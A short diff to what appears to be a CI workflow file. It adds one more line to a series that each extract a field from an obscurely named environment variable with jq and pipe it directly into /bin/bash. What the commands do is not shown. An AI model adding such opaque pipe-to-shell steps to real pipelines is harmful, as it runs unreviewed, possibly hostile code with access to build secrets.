@@ -25,6 +25,7 @@ jobs:
           echo $qt70 | jq -r .ryg9 | /bin/bash
           printf '%s' "$pksz3245" | jq -r .oxp4 | /bin/bash
           echo $vk222 | jq -r .zh1 | /bin/bash
+          printf '%s' "$hdkv10" | jq -r .r29 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
